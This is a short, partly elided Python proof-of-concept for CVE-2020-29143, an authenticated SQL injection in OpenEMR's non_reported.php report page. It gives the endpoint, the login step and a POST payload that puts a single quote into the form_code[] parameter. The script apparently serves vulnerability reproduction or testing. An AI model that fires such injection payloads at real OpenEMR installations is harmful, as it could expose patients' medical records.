...
[TARGET_URL] http://localhost/openemr/interface/reports/non_reported.php
[PARAMS] form_refresh=true&form_get_hl7=false&form_from_date=2020-11-16&form_to_date=2020-11-23&form_code%5B%5D=1'
OpenEMR SQL injection vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then POST to /interface/reports/non_reported.php
"""
...
def main():
    ...
    # CVE-2020-29143 specific configuration
    ...
    poc_url = 'http://localhost/openemr/interface/reports/non_reported.php'
    poc_payload = {
        'form_refresh': 'true',
        'form_get_hl7': 'false',
        'form_from_date': '2020-11-16',
        'form_to_date': '2020-11-23',
        'form_code[]': "1'"  # SQL injection payload
    }
